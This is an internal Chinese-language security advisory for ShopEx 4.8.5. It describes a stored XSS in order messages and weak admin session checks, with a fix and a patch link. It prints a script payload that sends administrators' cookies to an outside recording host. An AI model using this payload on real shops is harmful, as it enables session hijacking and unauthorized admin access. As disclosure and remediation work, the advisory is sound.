<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META NAME="generator" CONTENT="http://txt2tags.sf.net">
</HEAD><BODY BGCOLOR="white" TEXT="black">
<FONT SIZE="4">
</FONT></CENTER>

<P>
添加时间
</P>
<P>
2010-07-26
</P>
<P>
系统编号
</P>
<P>
SEC-0726-01
</P>
<P>
影响版本
</P>
<P>
ShopEx485-38669
</P>
<P>
漏洞危害
</P>
<P>
劫持正常管理员的会话，非法登录后台
</P>
<P>
漏洞原理
</P>
<P>
1）XSS
</P>
<P>
前台会员中心的订单留言输出没有过滤，注册用户购买商品后，进入会员中心，在订单留言中提交这样的留言内容来获取到管理员的cookie 
</P>
<P>
&lt;script&gt;document.write('&lt;img width=0 height=0 src=<A HREF="http://www.remote.com/record.php?cookies=">http://www.remote.com/record.php?cookies=</A>'+document.cookie+' /&gt;');&lt;/script&gt;
</P>
<P>
也可以简单提交
</P>
<P>
&lt;script&gt;alert('hi');&lt;/script&gt;
</P>
<P>
这些js代码写入数据库或者输出到页面的时候都没有转义，可以在页面中正常执行，登录后台查看这样的留言，应该可以看到弹出框。
</P>
<P>
2）CSRF
</P>
<P>
在core/include/adminCore.php没有对客户端做验证。 
</P>
<P>
        }elseif($_COOKIE['SHOPEX_SID']){
            $this-&gt;sess_id = $_COOKIE['SHOPEX_SID'];
        }else{
</P>
<P>
代码仅判断$_COOKIE['SHOPEX_SID'])是否有值，而没有判断它是否是来自同一个浏览器，恶意用户可以用窃取来的'SHOPEX_SID'登录后台。
</P>
<P>
解决方案
</P>
<P>
1） XSS，用户的输入信息在入库前转义掉
2） CSRF，结合SESSION，在session中放置标识用户身份的字串，类似这样的：
</P>
<P>
$chk = @md5(
        $_SERVER['HTTP_ACCEPT_CHARSET'] . 
        $_SERVER['HTTP_ACCEPT_ENCODING'] .
        $_SERVER['HTTP_ACCEPT_LANGUAGE'] .
        $_SERVER['HTTP_USER_AGENT']);                                 
</P>
<P>
if (empty($_SESSION))
        $_SESSION['key'] = $chk;
else if ($_SESSION['key'] != $chk) 
        session_destroy();
</P>
<P>
……后续正常的代码
</P>
<P>
主线版本补丁：
</P>
<P>
<A HREF="http://downtcom.shopex.cn/update/sec100726-01-42355-45144.zip">http://downtcom.shopex.cn/update/sec100726-01-42355-45144.zip</A> 
</P>
<P>
信息来源
</P>
<P>
<A HREF="http://nod32.5151shop.com/?p=860">http://nod32.5151shop.com/?p=860</A>
</P>
<P>
注意事项
</P>
<P>
1）主线版本将在shopex485版本的7号补丁中集成该漏洞的补丁。绿保服务部门的同仁要及时给prima上的用户打上补丁。
2）平台部saas系统请自行检查在前台用户输入点是否有问题（留言，商品评论，商品咨询，订单留言，订单填写页备注，售后服务申请等），如有问题，请反馈到我处报备，修补方案自定
3）B2B平台操作方法同平台部。
4）大客户部将根据项目实际情况自行修改，如有技术疑问可以直接咨询企业开发部的陈磊，或者我也可以的 ：）
</P>
<P>
附:
</P>
<P>
XSS问题除了订单留言外，测试部的同事还发现其他点也存在同样输出未转义的问题，详细的点请看附件。
</P>

<!-- html code generated by txt2tags 2.5 (http://txt2tags.sf.net) -->
<!-- cmdline: txt2tags -\-target=html -\-infile=t2t/sec10072601.t2t -\-outfile=htdocs/sec10072601.html -->
</BODY></HTML>
